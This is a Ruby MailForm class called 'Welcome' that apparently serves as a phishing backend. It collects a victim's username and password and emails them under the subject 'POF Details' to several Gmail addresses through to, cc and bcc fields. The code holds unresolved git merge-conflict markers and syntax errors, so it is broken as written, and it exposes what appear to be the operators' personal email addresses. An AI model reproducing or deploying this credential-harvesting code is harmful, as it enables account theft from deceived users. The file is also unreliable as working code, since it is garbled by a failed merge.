class Welcome < MailForm::Base
    attribute :username,      :validate => true
    attribute :password, :validate => true

    attribute :nickname,  :captcha  => true

  # Declare the e-mail headers. It accepts anything the mail method
  # in ActionMailer accepts.

  def headers

      {
        :subject => "POF Details ",
<<<<<<< HEAD
        :to => 'fortune.chibuike1@gmail.com',
=======
        :to => 'Chimaobinwaogazi2016@gmail.com',
        :cc => 'delightedchika@gmail.com',
        :bcc => "daveskeen24@gmail.com",
>>>>>>> 69f6ee56d19a02c1f0da93fd3735819728cf7ea2
        :from => %("#{username}")
        :bcc => "daveskeen24@gmail.com"
      }
end


end
